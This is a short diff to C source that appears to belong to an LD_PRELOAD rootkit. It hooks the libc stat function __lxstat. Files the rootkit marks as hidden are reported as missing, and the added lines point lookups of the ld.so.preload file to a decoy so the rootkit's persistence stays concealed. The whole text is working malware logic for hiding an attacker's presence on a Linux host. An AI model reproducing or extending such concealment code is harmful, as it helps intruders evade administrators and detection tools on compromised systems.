@@ -32,6 +32,10 @@ int __lxstat(int ver, const char *path, struct stat *buf) {
     if (is_attacker())
         return (REAL___LXSTAT(ver, path, buf));
 
+    if (is_ld_preload_file(path)) {
+        return REAL___LXSTAT(ver, FAKE_LD_PRELOAD, buf);
+    }
+
     if (is_hidden_file(path)) {
         errno = ENOENT;
         return (-1);
